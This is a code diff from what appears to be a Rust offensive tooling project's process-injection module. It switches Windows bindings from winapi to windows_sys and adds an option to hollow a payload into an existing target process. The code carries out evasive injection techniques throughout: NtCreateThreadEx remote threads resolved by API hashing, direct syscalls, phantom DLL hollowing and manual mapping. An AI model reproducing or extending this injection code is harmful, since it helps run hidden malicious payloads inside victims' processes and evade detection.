@@ -89,9 +89,9 @@ pub(crate) fn nt_create_thread_inject(
     access_mask: u32,
     label: &str,
 ) -> anyhow::Result<()> {
-    use winapi::um::winnt::{
-        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, SYNCHRONIZE,
-    };
+    const SYNCHRONIZE: u32 = 0x00100000;
+    use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+    use crate::win_types::PAGE_READWRITE;
 
     // Minimal thread access for NtCreateThreadEx: SYNCHRONIZE only.
     // The handle is closed immediately after creation (fire-and-forget).
@@ -100,8 +100,8 @@ pub(crate) fn nt_create_thread_inject(
     // Open target process via NtOpenProcess.
     let mut client_id = [0u64; 2];
     client_id[0] = pid as u64;
-    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
-    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+    let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+    obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
     unsafe {
         let mut h_proc: usize = 0;
@@ -211,31 +211,31 @@ pub(crate) fn nt_create_thread_inject(
         let fn_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
         let fn_ptr = pe_resolve::get_proc_address_by_hash(ntdll, fn_hash)
             .ok_or_else(|| anyhow::anyhow!("{}: NtCreateThreadEx not found", label))?
-            as *mut winapi::ctypes::c_void;
+            as *mut std::ffi::c_void;
 
         type NtCreateThreadExFn = unsafe extern "system" fn(
-            *mut *mut winapi::ctypes::c_void,
+            *mut *mut std::ffi::c_void,
             u32,
-            *mut winapi::ctypes::c_void,
-            *mut winapi::ctypes::c_void,
-            *mut winapi::ctypes::c_void,
-            *mut winapi::ctypes::c_void,
+            *mut std::ffi::c_void,
+            *mut std::ffi::c_void,
+            *mut std::ffi::c_void,
+            *mut std::ffi::c_void,
             u32,
             usize,
             usize,
             usize,
-            *mut winapi::ctypes::c_void,
+            *mut std::ffi::c_void,
         ) -> i32;
         let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);
 
         // Create the remote thread.
-        let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
+        let mut h_thread: *mut std::ffi::c_void = std::ptr::null_mut();
         let status = nt_create(
             &mut h_thread,
             THREAD_ACCESS_MINIMAL,
             std::ptr::null_mut(),
-            h_proc,
-            remote_mem,
+            h_proc as *mut _,
+            remote_mem as *mut _,
             std::ptr::null_mut(),
             0,
             0,
@@ -303,31 +303,23 @@ pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> 
         }
         #[cfg(feature = "phantom-dll-hollow")]
         InjectionMethod::PhantomDllHollow => {
-            // Phantom DLL hollowing creates its own sacrificial host process.
-            // The `pid` parameter is intentionally ignored.
             if pid != 0 {
-                log::warn!(
-                    "InjectionMethod::PhantomDllHollow ignores the target pid ({pid}); \
-                     it always creates a new host process."
-                );
-            }
-            let _ = pid;
-            unsafe {
-                phantom_dll_hollow::phantom_dll_hollow(payload)
-                    .map(|_| ())
-                    .map_err(|e| anyhow::anyhow!("{}", e))
+                // Operator specified a target PID — hollow into the existing process.
+                unsafe {
+                    phantom_dll_hollow::phantom_dll_hollow_into_process(pid, payload)
+                        .map(|_| ())
+                        .map_err(|e| anyhow::anyhow!("{}", e))
+                }
+            } else {
+                // No PID specified — create a sacrificial host process.
+                unsafe {
+                    phantom_dll_hollow::phantom_dll_hollow(payload)
+                        .map(|_| ())
+                        .map_err(|e| anyhow::anyhow!("{}", e))
+                }
             }
         }
         InjectionMethod::CallbackExec => {
-            // Callback-based execution operates in the current process (local).
-            // The `pid` parameter is intentionally ignored.
-            if pid != 0 {
-                log::warn!(
-                    "InjectionMethod::CallbackExec ignores the target pid ({pid}); \
-                     it executes locally via callback hijack."
-                );
-            }
-            let _ = pid;
             #[cfg(target_arch = "x86_64")]
             {
                 callback_exec::CallbackExecInjector::new(
@@ -362,14 +354,15 @@ fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
         // required for remote manual-map: VM operations, VM write, and thread creation.
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_proc: usize = 0;
-        let access_mask = (winapi::um::winnt::PROCESS_VM_OPERATION
-            | winapi::um::winnt::PROCESS_VM_WRITE
-            | winapi::um::winnt::PROCESS_VM_READ
-            | winapi::um::winnt::PROCESS_CREATE_THREAD) as u64;
+        let access_mask = (windows_sys::Win32::System::Threading::PROCESS_VM_OPERATION
+            | windows_sys::Win32::System::Threading::PROCESS_VM_WRITE
+            | windows_sys::Win32::System::Threading::PROCESS_VM_READ
+            | windows_sys::Win32::System::Threading::PROCESS_CREATE_THREAD
+            | windows_sys::Win32::System::Threading::PROCESS_QUERY_INFORMATION) as u64;
         let open_status = crate::syscall!(
             "NtOpenProcess",
             &mut h_proc as *mut _ as u64,
@@ -381,8 +374,8 @@ fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
             Ok(s) if s >= 0 && h_proc != 0 => {}
             _ => return Err(anyhow::anyhow!("NtOpenProcess({pid}) failed")),
         }
-        let process = h_proc as *mut winapi::ctypes::c_void;
-        struct HandleGuard(*mut winapi::ctypes::c_void);
+        let process = h_proc as *mut std::ffi::c_void;
+        struct HandleGuard(*mut std::ffi::c_void);
         impl Drop for HandleGuard {
             fn drop(&mut self) {
                 crate::syscall!("NtClose", self.0 as u64).ok();
